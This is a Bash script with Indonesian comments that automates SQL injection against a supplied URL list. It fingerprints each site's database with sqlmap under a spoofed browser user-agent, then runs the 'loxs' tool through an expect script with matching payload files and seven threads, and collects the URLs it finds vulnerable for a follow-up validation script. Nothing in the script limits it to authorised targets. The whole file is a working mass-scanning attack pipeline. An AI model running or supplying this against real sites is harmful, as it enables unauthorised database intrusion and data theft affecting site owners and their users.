#!/bin/bash
# Pindah ke direktori skrip agar output disimpan di lokasi yang benar
script_dir="$(dirname "$(realpath "$0")")"
cd "$script_dir" || exit 1

input_file="$1"
paramkosong_file="$2"
session_id="$3"
export SQLI_SESSION_ID="$session_id"
# Validasi input file
if [[ ! -f "$input_file" ]]; then
  echo "⚠ File input tidak ditemukan: $input_file"
  exit 1
fi


if [[ ! -f "$paramkosong_file" ]]; then
  echo "⚠ File parameter kosong tidak ditemukan: $paramkosong_file"
  exit 1
fi


# Buat timestamp + folder output
timestamp="$(date +'%Y%m%d-%H%M%S')_$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 4)"
output_dir="scan_${timestamp}"
mkdir -p "$output_dir"

logfile="$output_dir/full_output_${timestamp}.log"
cleanlog="$output_dir/clean_output_${timestamp}.log"
outputfile="$output_dir/vuln_urls_${timestamp}.txt"

# Ekspor path absolut input
export INPUTFILE="$(realpath "$paramkosong_file")"
# ─────────────────────────────────────────────────────────
# ✨ Deteksi DBMS otomatis
echo "[i] Deteksi jenis DBMS dari Daftar URL..."
dbms_tmp=$(mktemp)
sqlmap_log="$output_dir/sqlmap_detect.log"

mapfile -t urls < "$input_file"
for url in "${urls[@]}"; do
  echo "[*] Menguji: $url"
  stdbuf -oL sqlmap -u "$url" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" --batch --flush-session --dbs --answers="test=Y" 2>&1 | tee "$sqlmap_log" | while IFS= read -r line; do
    echo "$line"
    if [[ "$line" == *"it looks like the back-end DBMS is"* ]]; then
      dbms_found=$(echo "$line" | grep -oE "'[^']+'" | tr -d "'")
      echo "$dbms_found" > "$dbms_tmp"
      echo "[✓] DBMS terdeteksi dari: $url → $dbms_found"
      killall -q sqlmap 2>/dev/null
      break
    fi
  done

  # Jika sudah ditemukan, hentikan loop luar
  if [[ -s "$dbms_tmp" ]]; then
    break
  fi
done

if [[ -f "$dbms_tmp" ]]; then
  dbms=$(cat "$dbms_tmp" | tr '[:upper:]' '[:lower:]')
  rm -f "$dbms_tmp"
else
  echo "⚠ Gagal mendeteksi jenis DBMS dari semua URL."
  exit 1
fi


payload_path="$HOME/Downloads/loxs/payloads/sqli/${dbms}.txt"

if [[ ! -f "$payload_path" ]]; then
  echo "⚠ File payload tidak ditemukan: $payload_path"
  exit 1
fi

echo "[✓] DBMS terdeteksi: $dbms"
echo "[•] Payload dipilih : $payload_path"

# ─────────────────────────────────────────────────────────
# Jalankan loxs.py via expect
expect_tmp=$(mktemp)
export PAYLOAD_PATH="$payload_path"
cat > "$expect_tmp" <<'EOF'
#!/usr/bin/expect -f
set timeout -1
cd ~/Downloads/loxs
spawn python3 loxs.py
expect "Select an option" { send "3\r" }
expect "Enter the path to the input file containing the URLs" { send "[file normalize $env(INPUTFILE)]\r" }
expect "Enter the path to the payloads file" { send "[file normalize $env(PAYLOAD_PATH)]\r" }
expect "Enter the cookie to include in the GET request" { send "\r" }
expect "Enter the number of concurrent threads" { send "7\r" }
expect {
  "Vulnerability found. Do you want to continue testing other payloads?" { send "y\r"; exp_continue }
  -re "Do you want to generate an HTML report.*" { send "n\r" }
}
expect eof
EOF


chmod +x "$expect_tmp"
script -q -c "$expect_tmp" "$logfile"

# Bersihkan warna escape dari log
sed 's/\x1B\[[0-9;]*[a-zA-Z]//g' "$logfile" > "$cleanlog"

# Ekstrak [+] Vulnerable URLs
awk '/^\[✓\] Vulnerable:/ {
  match($0, /(https?:\/\/[^ ]+)/, arr)
  if (arr[1] != "") print arr[1]
}' "$cleanlog" > "$outputfile"


# Validasi hasil
if [[ ! -s "$outputfile" ]]; then
  echo "⚠ Tidak ditemukan URL rentan dari hasil scan."
  echo "ℹ Proses dihentikan. Folder tetap disimpan: $output_dir"
  rm -f "$expect_tmp"
  exit 0
fi

echo
echo "[✓] Hasil berhasil disimpan di folder: $output_dir"
echo "[📄] - Log lengkap     : $logfile"
echo "[📄] - Log bersih      : $cleanlog"
echo "[📄] - URL rentan      : $outputfile"

# Cleanup
rm -f "$expect_tmp"
sync && sleep 1
dos2unix "$outputfile" 2>/dev/null
# ─────────────────────────────────────────────────────────
# Jalankan validasi akhir jika hasil ditemukan
if [[ -s "$outputfile" ]]; then
  echo
  echo "[→] Melanjutkan ke tahap validasi akhir SQLi..."
  "$script_dir/validate_sqli_summary.sh" "$outputfile"
else
  echo "⚠ Tidak ada hasil untuk divalidasi. Tahap validasi dilewati."
fi
